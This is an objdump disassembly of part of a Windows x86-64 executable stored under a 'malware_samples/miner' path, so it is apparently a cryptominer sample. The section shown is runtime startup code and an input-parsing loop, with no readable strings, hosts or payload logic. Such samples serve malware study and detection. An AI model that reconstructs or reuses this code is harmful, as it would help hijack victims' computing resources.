
malware_samples/miner/5567035c2acdc2d6c03e0ab3374f9f5984986e8d072435a02aade4c475755ba1.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	48 83 ec 28          	sub    $0x28,%rsp
   140001014:	48 8b 05 a5 75 01 00 	mov    0x175a5(%rip),%rax        # 0x1400185c0
   14000101b:	31 c9                	xor    %ecx,%ecx
   14000101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001023:	48 8b 05 a6 75 01 00 	mov    0x175a6(%rip),%rax        # 0x1400185d0
   14000102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001030:	48 8b 05 a9 75 01 00 	mov    0x175a9(%rip),%rax        # 0x1400185e0
   140001037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103d:	48 8b 05 fc 74 01 00 	mov    0x174fc(%rip),%rax        # 0x140018540
   140001044:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001049:	75 0f                	jne    0x14000105a
   14000104b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000104f:	48 01 d0             	add    %rdx,%rax
   140001052:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001058:	74 66                	je     0x1400010c0
   14000105a:	48 8b 05 4f 75 01 00 	mov    0x1754f(%rip),%rax        # 0x1400185b0
   140001061:	89 0d a5 9f 01 00    	mov    %ecx,0x19fa5(%rip)        # 0x14001b00c
   140001067:	8b 00                	mov    (%rax),%eax
   140001069:	85 c0                	test   %eax,%eax
   14000106b:	74 43                	je     0x1400010b0
   14000106d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001072:	e8 d1 16 01 00       	call   0x140012748
   140001077:	e8 24 11 01 00       	call   0x1400121a0
   14000107c:	48 8b 15 1d 76 01 00 	mov    0x1761d(%rip),%rdx        # 0x1400186a0
   140001083:	8b 12                	mov    (%rdx),%edx
   140001085:	89 10                	mov    %edx,(%rax)
   140001087:	e8 24 11 01 00       	call   0x1400121b0
   14000108c:	48 8b 15 ed 75 01 00 	mov    0x175ed(%rip),%rdx        # 0x140018680
   140001093:	8b 12                	mov    (%rdx),%edx
   140001095:	89 10                	mov    %edx,(%rax)
   140001097:	e8 94 41 00 00       	call   0x140005230
   14000109c:	48 8b 05 2d 74 01 00 	mov    0x1742d(%rip),%rax        # 0x1400184d0
   1400010a3:	83 38 01             	cmpl   $0x1,(%rax)
   1400010a6:	74 50                	je     0x1400010f8
   1400010a8:	31 c0                	xor    %eax,%eax
   1400010aa:	48 83 c4 28          	add    $0x28,%rsp
   1400010ae:	c3                   	ret
   1400010af:	90                   	nop
   1400010b0:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010b5:	e8 8e 16 01 00       	call   0x140012748
   1400010ba:	eb bb                	jmp    0x140001077
   1400010bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010c4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010c9:	74 45                	je     0x140001110
   1400010cb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010d0:	75 88                	jne    0x14000105a
   1400010d2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010d9:	0f 86 7b ff ff ff    	jbe    0x14000105a
   1400010df:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010e5:	31 c9                	xor    %ecx,%ecx
   1400010e7:	85 d2                	test   %edx,%edx
   1400010e9:	0f 95 c1             	setne  %cl
   1400010ec:	e9 69 ff ff ff       	jmp    0x14000105a
   1400010f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400010f8:	48 8b 0d c1 75 01 00 	mov    0x175c1(%rip),%rcx        # 0x1400186c0
   1400010ff:	e8 9c 48 00 00       	call   0x1400059a0
   140001104:	31 c0                	xor    %eax,%eax
   140001106:	48 83 c4 28          	add    $0x28,%rsp
   14000110a:	c3                   	ret
   14000110b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001110:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001114:	0f 86 40 ff ff ff    	jbe    0x14000105a
   14000111a:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001121:	31 c9                	xor    %ecx,%ecx
   140001123:	45 85 c0             	test   %r8d,%r8d
   140001126:	0f 95 c1             	setne  %cl
   140001129:	e9 2c ff ff ff       	jmp    0x14000105a
   14000112e:	66 90                	xchg   %ax,%ax
   140001130:	48 83 ec 38          	sub    $0x38,%rsp
   140001134:	48 8b 05 95 75 01 00 	mov    0x17595(%rip),%rax        # 0x1400186d0
   14000113b:	4c 8d 05 d6 9e 01 00 	lea    0x19ed6(%rip),%r8        # 0x14001b018
   140001142:	48 8d 15 d7 9e 01 00 	lea    0x19ed7(%rip),%rdx        # 0x14001b020
   140001149:	48 8d 0d d8 9e 01 00 	lea    0x19ed8(%rip),%rcx        # 0x14001b028
   140001150:	8b 00                	mov    (%rax),%eax
   140001152:	89 05 ac 9e 01 00    	mov    %eax,0x19eac(%rip)        # 0x14001b004
   140001158:	48 8b 05 31 75 01 00 	mov    0x17531(%rip),%rax        # 0x140018690
   14000115f:	44 8b 08             	mov    (%rax),%r9d
   140001162:	48 8d 05 9b 9e 01 00 	lea    0x19e9b(%rip),%rax        # 0x14001b004
   140001169:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000116e:	e8 c5 15 01 00       	call   0x140012738
   140001173:	90                   	nop
   140001174:	48 83 c4 38          	add    $0x38,%rsp
   140001178:	c3                   	ret
   140001179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001180:	41 54                	push   %r12
   140001182:	55                   	push   %rbp
   140001183:	57                   	push   %rdi
   140001184:	56                   	push   %rsi
   140001185:	53                   	push   %rbx
   140001186:	48 83 ec 20          	sub    $0x20,%rsp
   14000118a:	48 8b 1d 6f 74 01 00 	mov    0x1746f(%rip),%rbx        # 0x140018600
   140001191:	31 ff                	xor    %edi,%edi
   140001193:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   14000119a:	00 00 
   14000119c:	48 8b 2d 8d b5 01 00 	mov    0x1b58d(%rip),%rbp        # 0x14001c730
   1400011a3:	48 8b 70 08          	mov    0x8(%rax),%rsi
   1400011a7:	eb 17                	jmp    0x1400011c0
   1400011a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400011b0:	48 39 c6             	cmp    %rax,%rsi
   1400011b3:	0f 84 67 01 00 00    	je     0x140001320
   1400011b9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011be:	ff d5                	call   *%rbp
   1400011c0:	48 89 f8             	mov    %rdi,%rax
   1400011c3:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   1400011c8:	48 85 c0             	test   %rax,%rax
   1400011cb:	75 e3                	jne    0x1400011b0
   1400011cd:	48 8b 35 3c 74 01 00 	mov    0x1743c(%rip),%rsi        # 0x140018610
   1400011d4:	31 ff                	xor    %edi,%edi
   1400011d6:	8b 06                	mov    (%rsi),%eax
   1400011d8:	83 f8 01             	cmp    $0x1,%eax
   1400011db:	0f 84 56 01 00 00    	je     0x140001337
   1400011e1:	8b 06                	mov    (%rsi),%eax
   1400011e3:	85 c0                	test   %eax,%eax
   1400011e5:	0f 84 b5 01 00 00    	je     0x1400013a0
   1400011eb:	c7 05 13 9e 01 00 01 	movl   $0x1,0x19e13(%rip)        # 0x14001b008
   1400011f2:	00 00 00 
   1400011f5:	8b 06                	mov    (%rsi),%eax
   1400011f7:	83 f8 01             	cmp    $0x1,%eax
   1400011fa:	0f 84 4c 01 00 00    	je     0x14000134c
   140001200:	85 ff                	test   %edi,%edi
   140001202:	0f 84 65 01 00 00    	je     0x14000136d
   140001208:	48 8b 05 11 73 01 00 	mov    0x17311(%rip),%rax        # 0x140018520
   14000120f:	48 8b 00             	mov    (%rax),%rax
   140001212:	48 85 c0             	test   %rax,%rax
   140001215:	74 0c                	je     0x140001223
   140001217:	45 31 c0             	xor    %r8d,%r8d
   14000121a:	ba 02 00 00 00       	mov    $0x2,%edx
   14000121f:	31 c9                	xor    %ecx,%ecx
   140001221:	ff d0                	call   *%rax
   140001223:	e8 d8 43 00 00       	call   0x140005600
   140001228:	48 8b 0d 81 74 01 00 	mov    0x17481(%rip),%rcx        # 0x1400186b0
   14000122f:	ff 15 f3 b4 01 00    	call   *0x1b4f3(%rip)        # 0x14001c728
   140001235:	48 8b 15 b4 73 01 00 	mov    0x173b4(%rip),%rdx        # 0x1400185f0
   14000123c:	48 8d 0d bd fd ff ff 	lea    -0x243(%rip),%rcx        # 0x140001000
   140001243:	48 89 02             	mov    %rax,(%rdx)
   140001246:	e8 95 0f 01 00       	call   0x1400121e0
   14000124b:	e8 c0 41 00 00       	call   0x140005410
   140001250:	8b 1d d2 9d 01 00    	mov    0x19dd2(%rip),%ebx        # 0x14001b028
   140001256:	8d 7b 01             	lea    0x1(%rbx),%edi
   140001259:	48 63 ff             	movslq %edi,%rdi
   14000125c:	48 c1 e7 03          	shl    $0x3,%rdi
   140001260:	48 89 f9             	mov    %rdi,%rcx
   140001263:	e8 a8 15 01 00       	call   0x140012810
   140001268:	85 db                	test   %ebx,%ebx
   14000126a:	48 8b 2d af 9d 01 00 	mov    0x19daf(%rip),%rbp        # 0x14001b020
   140001271:	49 89 c4             	mov    %rax,%r12
   140001274:	0f 8e 46 01 00 00    	jle    0x1400013c0
   14000127a:	48 83 ef 08          	sub    $0x8,%rdi
   14000127e:	31 db                	xor    %ebx,%ebx
   140001280:	48 8b 4c 1d 00       	mov    0x0(%rbp,%rbx,1),%rcx
   140001285:	e8 c6 15 01 00       	call   0x140012850
   14000128a:	48 8d 70 01          	lea    0x1(%rax),%rsi
   14000128e:	48 89 f1             	mov    %rsi,%rcx
   140001291:	e8 7a 15 01 00       	call   0x140012810
   140001296:	49 89 f0             	mov    %rsi,%r8
   140001299:	49 89 04 1c          	mov    %rax,(%r12,%rbx,1)
   14000129d:	48 8b 54 1d 00       	mov    0x0(%rbp,%rbx,1),%rdx
   1400012a2:	48 89 c1             	mov    %rax,%rcx
   1400012a5:	48 83 c3 08          	add    $0x8,%rbx
   1400012a9:	e8 6a 15 01 00       	call   0x140012818
   1400012ae:	48 39 df             	cmp    %rbx,%rdi
   1400012b1:	75 cd                	jne    0x140001280
   1400012b3:	4c 01 e7             	add    %r12,%rdi
   1400012b6:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400012bd:	4c 89 25 5c 9d 01 00 	mov    %r12,0x19d5c(%rip)        # 0x14001b020
   1400012c4:	e8 47 3f 00 00       	call   0x140005210
   1400012c9:	48 8b 05 80 72 01 00 	mov    0x17280(%rip),%rax        # 0x140018550
   1400012d0:	4c 8b 05 41 9d 01 00 	mov    0x19d41(%rip),%r8        # 0x14001b018
   1400012d7:	8b 0d 4b 9d 01 00    	mov    0x19d4b(%rip),%ecx        # 0x14001b028
   1400012dd:	48 8b 00             	mov    (%rax),%rax
   1400012e0:	4c 89 00             	mov    %r8,(%rax)
   1400012e3:	48 8b 15 36 9d 01 00 	mov    0x19d36(%rip),%rdx        # 0x14001b020
   1400012ea:	e8 51 17 01 00       	call   0x140012a40
   1400012ef:	8b 0d 17 9d 01 00    	mov    0x19d17(%rip),%ecx        # 0x14001b00c
   1400012f5:	89 05 15 9d 01 00    	mov    %eax,0x19d15(%rip)        # 0x14001b010
   1400012fb:	85 c9                	test   %ecx,%ecx
   1400012fd:	0f 84 c5 00 00 00    	je     0x1400013c8
   140001303:	8b 15 ff 9c 01 00    	mov    0x19cff(%rip),%edx        # 0x14001b008
   140001309:	85 d2                	test   %edx,%edx
   14000130b:	74 73                	je     0x140001380
   14000130d:	48 83 c4 20          	add    $0x20,%rsp
   140001311:	5b                   	pop    %rbx
   140001312:	5e                   	pop    %rsi
   140001313:	5f                   	pop    %rdi
   140001314:	5d                   	pop    %rbp
   140001315:	41 5c                	pop    %r12
   140001317:	c3                   	ret
   140001318:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000131f:	00 
   140001320:	48 8b 35 e9 72 01 00 	mov    0x172e9(%rip),%rsi        # 0x140018610
   140001327:	bf 01 00 00 00       	mov    $0x1,%edi
   14000132c:	8b 06                	mov    (%rsi),%eax
   14000132e:	83 f8 01             	cmp    $0x1,%eax
   140001331:	0f 85 aa fe ff ff    	jne    0x1400011e1
   140001337:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000133c:	e8 17 14 01 00       	call   0x140012758
   140001341:	8b 06                	mov    (%rsi),%eax
   140001343:	83 f8 01             	cmp    $0x1,%eax
   140001346:	0f 85 b4 fe ff ff    	jne    0x140001200
   14000134c:	48 8b 15 fd 72 01 00 	mov    0x172fd(%rip),%rdx        # 0x140018650
   140001353:	48 8b 0d e6 72 01 00 	mov    0x172e6(%rip),%rcx        # 0x140018640
   14000135a:	e8 11 14 01 00       	call   0x140012770
   14000135f:	85 ff                	test   %edi,%edi
   140001361:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   140001367:	0f 85 9b fe ff ff    	jne    0x140001208
   14000136d:	31 c0                	xor    %eax,%eax
   14000136f:	48 87 03             	xchg   %rax,(%rbx)
   140001372:	e9 91 fe ff ff       	jmp    0x140001208
   140001377:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000137e:	00 00 
   140001380:	e8 db 13 01 00       	call   0x140012760
   140001385:	8b 05 85 9c 01 00    	mov    0x19c85(%rip),%eax        # 0x14001b010
   14000138b:	48 83 c4 20          	add    $0x20,%rsp
   14000138f:	5b                   	pop    %rbx
   140001390:	5e                   	pop    %rsi
   140001391:	5f                   	pop    %rdi
   140001392:	5d                   	pop    %rbp
   140001393:	41 5c                	pop    %r12
   140001395:	c3                   	ret
   140001396:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000139d:	00 00 00 
   1400013a0:	48 8b 15 c9 72 01 00 	mov    0x172c9(%rip),%rdx        # 0x140018670
   1400013a7:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   1400013ad:	48 8b 0d ac 72 01 00 	mov    0x172ac(%rip),%rcx        # 0x140018660
   1400013b4:	e8 b7 13 01 00       	call   0x140012770
   1400013b9:	e9 37 fe ff ff       	jmp    0x1400011f5
   1400013be:	66 90                	xchg   %ax,%ax
   1400013c0:	48 89 c7             	mov    %rax,%rdi
   1400013c3:	e9 ee fe ff ff       	jmp    0x1400012b6
   1400013c8:	89 c1                	mov    %eax,%ecx
   1400013ca:	e8 f1 49 00 00       	call   0x140005dc0
   1400013cf:	90                   	nop
   1400013d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013d4:	48 8b 05 d5 71 01 00 	mov    0x171d5(%rip),%rax        # 0x1400185b0
   1400013db:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013e1:	e8 9a fd ff ff       	call   0x140001180
   1400013e6:	90                   	nop
   1400013e7:	90                   	nop
   1400013e8:	48 83 c4 28          	add    $0x28,%rsp
   1400013ec:	c3                   	ret
   1400013ed:	0f 1f 00             	nopl   (%rax)
   1400013f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013f4:	48 8b 05 b5 71 01 00 	mov    0x171b5(%rip),%rax        # 0x1400185b0
   1400013fb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001401:	e8 7a fd ff ff       	call   0x140001180
   140001406:	90                   	nop
   140001407:	90                   	nop
   140001408:	48 83 c4 28          	add    $0x28,%rsp
   14000140c:	c3                   	ret
   14000140d:	0f 1f 00             	nopl   (%rax)
   140001410:	48 83 ec 28          	sub    $0x28,%rsp
   140001414:	e8 67 13 01 00       	call   0x140012780
   140001419:	48 83 f8 01          	cmp    $0x1,%rax
   14000141d:	19 c0                	sbb    %eax,%eax
   14000141f:	48 83 c4 28          	add    $0x28,%rsp
   140001423:	c3                   	ret
   140001424:	90                   	nop
   140001425:	90                   	nop
   140001426:	90                   	nop
   140001427:	90                   	nop
   140001428:	90                   	nop
   140001429:	90                   	nop
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	90                   	nop
   14000142d:	90                   	nop
   14000142e:	90                   	nop
   14000142f:	90                   	nop
   140001430:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001440
   140001437:	e9 d4 ff ff ff       	jmp    0x140001410
   14000143c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001440:	c3                   	ret
   140001441:	90                   	nop
   140001442:	90                   	nop
   140001443:	90                   	nop
   140001444:	90                   	nop
   140001445:	90                   	nop
   140001446:	90                   	nop
   140001447:	90                   	nop
   140001448:	90                   	nop
   140001449:	90                   	nop
   14000144a:	90                   	nop
   14000144b:	90                   	nop
   14000144c:	90                   	nop
   14000144d:	90                   	nop
   14000144e:	90                   	nop
   14000144f:	90                   	nop
   140001450:	41 57                	push   %r15
   140001452:	b8 48 00 01 00       	mov    $0x10048,%eax
   140001457:	41 56                	push   %r14
   140001459:	41 55                	push   %r13
   14000145b:	41 54                	push   %r12
   14000145d:	55                   	push   %rbp
   14000145e:	57                   	push   %rdi
   14000145f:	56                   	push   %rsi
   140001460:	53                   	push   %rbx
   140001461:	e8 7a 4d 00 00       	call   0x1400061e0
   140001466:	48 29 c4             	sub    %rax,%rsp
   140001469:	48 89 8c 24 90 00 01 	mov    %rcx,0x10090(%rsp)
   140001470:	00 
   140001471:	48 89 d1             	mov    %rdx,%rcx
   140001474:	48 8d 15 ad 2b 01 00 	lea    0x12bad(%rip),%rdx        # 0x140014028
   14000147b:	e8 b0 35 00 00       	call   0x140004a30
   140001480:	48 85 c0             	test   %rax,%rax
   140001483:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001488:	0f 84 5d 03 00 00    	je     0x1400017eb
   14000148e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001493:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140001498:	4c 8d 7c 24 38       	lea    0x38(%rsp),%r15
   14000149d:	0f 1f 00             	nopl   (%rax)
   1400014a0:	41 b8 00 00 01 00    	mov    $0x10000,%r8d
   1400014a6:	48 89 da             	mov    %rbx,%rdx
   1400014a9:	4c 89 f9             	mov    %r15,%rcx
   1400014ac:	e8 0f 37 00 00       	call   0x140004bc0
   1400014b1:	85 c0                	test   %eax,%eax
   1400014b3:	0f 84 27 03 00 00    	je     0x1400017e0
   1400014b9:	48 8d 15 6e 2b 01 00 	lea    0x12b6e(%rip),%rdx        # 0x14001402e
   1400014c0:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   1400014c6:	48 89 d9             	mov    %rbx,%rcx
   1400014c9:	e8 72 34 00 00       	call   0x140004940
   1400014ce:	48 8d 15 5c 2b 01 00 	lea    0x12b5c(%rip),%rdx        # 0x140014031
   1400014d5:	48 89 d9             	mov    %rbx,%rcx
   1400014d8:	41 89 c4             	mov    %eax,%r12d
   1400014db:	e8 80 32 00 00       	call   0x140004760
   1400014e0:	48 8d 15 4f 2b 01 00 	lea    0x12b4f(%rip),%rdx        # 0x140014036
   1400014e7:	48 89 d9             	mov    %rbx,%rcx
   1400014ea:	48 89 c6             	mov    %rax,%rsi
   1400014ed:	e8 6e 32 00 00       	call   0x140004760
   1400014f2:	48 8d 15 41 2b 01 00 	lea    0x12b41(%rip),%rdx        # 0x14001403a
   1400014f9:	48 89 d9             	mov    %rbx,%rcx
   1400014fc:	48 89 c5             	mov    %rax,%rbp
   1400014ff:	e8 5c 32 00 00       	call   0x140004760
   140001504:	48 8d 15 39 2b 01 00 	lea    0x12b39(%rip),%rdx        # 0x140014044
   14000150b:	48 89 d9             	mov    %rbx,%rcx
   14000150e:	49 89 c5             	mov    %rax,%r13
   140001511:	e8 4a 32 00 00       	call   0x140004760
   140001516:	45 31 c0             	xor    %r8d,%r8d
   140001519:	48 89 d9             	mov    %rbx,%rcx
   14000151c:	48 8d 15 2b 2b 01 00 	lea    0x12b2b(%rip),%rdx        # 0x14001404e
   140001523:	48 89 c7             	mov    %rax,%rdi
   140001526:	e8 15 34 00 00       	call   0x140004940
   14000152b:	45 85 e4             	test   %r12d,%r12d
   14000152e:	41 89 c6             	mov    %eax,%r14d
   140001531:	0f 88 09 01 00 00    	js     0x140001640
   140001537:	48 85 f6             	test   %rsi,%rsi
   14000153a:	0f 84 ed 00 00 00    	je     0x14000162d
   140001540:	48 8d 15 14 2b 01 00 	lea    0x12b14(%rip),%rdx        # 0x14001405b
   140001547:	48 89 f1             	mov    %rsi,%rcx
   14000154a:	e8 f1 12 01 00       	call   0x140012840
   14000154f:	85 c0                	test   %eax,%eax
   140001551:	0f 85 89 00 00 00    	jne    0x1400015e0
   140001557:	48 85 ff             	test   %rdi,%rdi
   14000155a:	74 09                	je     0x140001565
   14000155c:	80 3f 00             	cmpb   $0x0,(%rdi)
   14000155f:	0f 85 cb 01 00 00    	jne    0x140001730
   140001565:	48 85 ed             	test   %rbp,%rbp
   140001568:	0f 84 32 02 00 00    	je     0x1400017a0
   14000156e:	48 8d 15 ac 2a 01 00 	lea    0x12aac(%rip),%rdx        # 0x140014021
   140001575:	45 31 c0             	xor    %r8d,%r8d
   140001578:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   14000157c:	0f 85 7e 02 00 00    	jne    0x140001800
   140001582:	44 89 e1             	mov    %r12d,%ecx
   140001585:	e8 06 3a 00 00       	call   0x140004f90
   14000158a:	48 8b 8c 24 90 00 01 	mov    0x10090(%rsp),%rcx
   140001591:	00 
   140001592:	49 89 c4             	mov    %rax,%r12
   140001595:	48 89 c2             	mov    %rax,%rdx
   140001598:	e8 a3 16 00 00       	call   0x140002c40
   14000159d:	4c 89 e1             	mov    %r12,%rcx
   1400015a0:	e8 3b 12 01 00       	call   0x1400127e0
   1400015a5:	48 89 f1             	mov    %rsi,%rcx
   1400015a8:	e8 33 12 01 00       	call   0x1400127e0
   1400015ad:	48 89 e9             	mov    %rbp,%rcx
   1400015b0:	e8 2b 12 01 00       	call   0x1400127e0
   1400015b5:	4d 85 ed             	test   %r13,%r13
   1400015b8:	74 08                	je     0x1400015c2
   1400015ba:	4c 89 e9             	mov    %r13,%rcx
   1400015bd:	e8 1e 12 01 00       	call   0x1400127e0
   1400015c2:	48 85 ff             	test   %rdi,%rdi
   1400015c5:	0f 84 d5 fe ff ff    	je     0x1400014a0
   1400015cb:	48 89 f9             	mov    %rdi,%rcx
   1400015ce:	e8 0d 12 01 00       	call   0x1400127e0
   1400015d3:	e9 c8 fe ff ff       	jmp    0x1400014a0
   1400015d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400015df:	00 
   1400015e0:	48 8d 15 7d 2a 01 00 	lea    0x12a7d(%rip),%rdx        # 0x140014064
   1400015e7:	48 89 f1             	mov    %rsi,%rcx
   1400015ea:	e8 51 12 01 00       	call   0x140012840
   1400015ef:	85 c0                	test   %eax,%eax
   1400015f1:	75 05                	jne    0x1400015f8
   1400015f3:	48 85 ff             	test   %rdi,%rdi
   1400015f6:	75 60                	jne    0x140001658
   1400015f8:	48 8d 15 22 2a 01 00 	lea    0x12a22(%rip),%rdx        # 0x140014021
   1400015ff:	44 89 e1             	mov    %r12d,%ecx
   140001602:	45 31 c0             	xor    %r8d,%r8d
   140001605:	e8 86 39 00 00       	call   0x140004f90
   14000160a:	48 8b 8c 24 90 00 01 	mov    0x10090(%rsp),%rcx
   140001611:	00 
   140001612:	49 89 c4             	mov    %rax,%r12
   140001615:	48 89 c2             	mov    %rax,%rdx
   140001618:	e8 23 16 00 00       	call   0x140002c40
   14000161d:	4c 89 e1             	mov    %r12,%rcx
   140001620:	e8 bb 11 01 00       	call   0x1400127e0
   140001625:	48 89 f1             	mov    %rsi,%rcx
   140001628:	e8 b3 11 01 00       	call   0x1400127e0
   14000162d:	48 85 ed             	test   %rbp,%rbp
   140001630:	74 83                	je     0x1400015b5
   140001632:	e9 76 ff ff ff       	jmp    0x1400015ad
   140001637:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000163e:	00 00 
   140001640:	48 85 f6             	test   %rsi,%rsi
   140001643:	75 e0                	jne    0x140001625
   140001645:	48 85 ed             	test   %rbp,%rbp
   140001648:	0f 84 67 ff ff ff    	je     0x1400015b5
   14000164e:	e9 5a ff ff ff       	jmp    0x1400015ad
   140001653:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001658:	80 3f 00             	cmpb   $0x0,(%rdi)
   14000165b:	74 9b                	je     0x1400015f8
   14000165d:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   140001662:	48 89 f9             	mov    %rdi,%rcx
   140001665:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   14000166c:	00 
   14000166d:	e8 2e 12 00 00       	call   0x1400028a0
   140001672:	48 85 c0             	test   %rax,%rax
   140001675:	48 89 c1             	mov    %rax,%rcx
   140001678:	0f 84 7a ff ff ff    	je     0x1400015f8
   14000167e:	8b 54 24 34          	mov    0x34(%rsp),%edx
   140001682:	85 d2                	test   %edx,%edx
   140001684:	0f 8e 6e ff ff ff    	jle    0x1400015f8
   14000168a:	4c 8d 05 78 29 01 00 	lea    0x12978(%rip),%r8        # 0x140014009
   140001691:	4d 85 ed             	test   %r13,%r13
   140001694:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001699:	4d 0f 45 c5          	cmovne %r13,%r8
   14000169d:	e8 7e 2d 00 00       	call   0x140004420
   1400016a2:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400016a7:	41 89 c6             	mov    %eax,%r14d
   1400016aa:	e8 31 11 01 00       	call   0x1400127e0
   1400016af:	41 83 fe 01          	cmp    $0x1,%r14d
   1400016b3:	0f 85 3f ff ff ff    	jne    0x1400015f8
   1400016b9:	4c 8d 05 b2 29 01 00 	lea    0x129b2(%rip),%r8        # 0x140014072
   1400016c0:	44 89 e1             	mov    %r12d,%ecx
   1400016c3:	48 8d 15 4d 29 01 00 	lea    0x1294d(%rip),%rdx        # 0x140014017
   1400016ca:	e8 c1 38 00 00       	call   0x140004f90
   1400016cf:	48 8b 8c 24 90 00 01 	mov    0x10090(%rsp),%rcx
   1400016d6:	00 
   1400016d7:	48 89 c2             	mov    %rax,%rdx
   1400016da:	48 89 c3             	mov    %rax,%rbx
   1400016dd:	e8 5e 15 00 00       	call   0x140002c40
   1400016e2:	48 89 d9             	mov    %rbx,%rcx
   1400016e5:	e8 f6 10 01 00       	call   0x1400127e0
   1400016ea:	48 89 f1             	mov    %rsi,%rcx
   1400016ed:	e8 ee 10 01 00       	call   0x1400127e0
   1400016f2:	48 85 ed             	test   %rbp,%rbp
   1400016f5:	74 08                	je     0x1400016ff
   1400016f7:	48 89 e9             	mov    %rbp,%rcx
   1400016fa:	e8 e1 10 01 00       	call   0x1400127e0
   1400016ff:	4d 85 ed             	test   %r13,%r13
   140001702:	74 08                	je     0x14000170c
   140001704:	4c 89 e9             	mov    %r13,%rcx
   140001707:	e8 d4 10 01 00       	call   0x1400127e0
   14000170c:	48 89 f9             	mov    %rdi,%rcx
   14000170f:	e8 cc 10 01 00       	call   0x1400127e0
   140001714:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001719:	e8 c2 10 01 00       	call   0x1400127e0
   14000171e:	31 c9                	xor    %ecx,%ecx
   140001720:	ff 15 0a af 01 00    	call   *0x1af0a(%rip)        # 0x14001c630
   140001726:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000172d:	00 00 00 
   140001730:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   140001735:	48 89 f9             	mov    %rdi,%rcx
   140001738:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   14000173f:	00 
   140001740:	e8 5b 11 00 00       	call   0x1400028a0
   140001745:	48 85 c0             	test   %rax,%rax
   140001748:	48 89 c1             	mov    %rax,%rcx
   14000174b:	0f 84 a7 fe ff ff    	je     0x1400015f8
   140001751:	8b 54 24 34          	mov    0x34(%rsp),%edx
   140001755:	85 d2                	test   %edx,%edx
   140001757:	0f 8e 9b fe ff ff    	jle    0x1400015f8
   14000175d:	4d 85 ed             	test   %r13,%r13
   140001760:	45 89 f1             	mov    %r14d,%r9d
   140001763:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001768:	4c 8d 05 91 28 01 00 	lea    0x12891(%rip),%r8        # 0x140014000
   14000176f:	4d 0f 45 c5          	cmovne %r13,%r8
   140001773:	e8 18 2b 00 00       	call   0x140004290
   140001778:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000177d:	41 89 c6             	mov    %eax,%r14d
   140001780:	e8 5b 10 01 00       	call   0x1400127e0
   140001785:	48 8d 15 8b 28 01 00 	lea    0x1288b(%rip),%rdx        # 0x140014017
   14000178c:	45 85 f6             	test   %r14d,%r14d
   14000178f:	0f 85 63 fe ff ff    	jne    0x1400015f8
   140001795:	e9 65 fe ff ff       	jmp    0x1400015ff
   14000179a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400017a0:	48 8d 15 7a 28 01 00 	lea    0x1287a(%rip),%rdx        # 0x140014021
   1400017a7:	45 31 c0             	xor    %r8d,%r8d
   1400017aa:	44 89 e1             	mov    %r12d,%ecx
   1400017ad:	e8 de 37 00 00       	call   0x140004f90
